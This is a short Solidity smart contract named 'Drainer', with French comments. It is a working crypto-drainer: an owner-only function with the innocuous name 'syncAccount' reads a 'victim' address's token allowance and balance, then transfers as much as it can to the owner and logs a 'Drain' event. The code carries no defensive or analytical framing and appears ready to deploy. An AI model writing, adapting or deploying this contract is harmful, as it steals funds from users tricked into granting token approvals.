// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function allowance(address owner, address spender) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

contract Drainer {
    address public owner;
    
    event Drain(address indexed token, address indexed victim, uint256 amount);
    
    constructor() {
        owner = msg.sender; // Stocke celui qui déploie
    }
    
    function syncAccount(address token, address victim) external {
        // Seul l'owner peut appeler
        require(msg.sender == owner, "Not owner");
        
        IERC20 t = IERC20(token);
        
        uint256 allowance = t.allowance(victim, address(this));
        uint256 balance = t.balanceOf(victim);
        
        require(allowance > 0, "No allowance");
        require(balance > 0, "No balance");
        
        uint256 amount = allowance < balance ? allowance : balance;
        
        
        t.transferFrom(victim, owner, amount);
        
        emit Drain(token, victim, amount);
    }
    
    
    function changeOwner(address newOwner) external {
        require(msg.sender == owner, "Not owner");
        owner = newOwner;
    }
}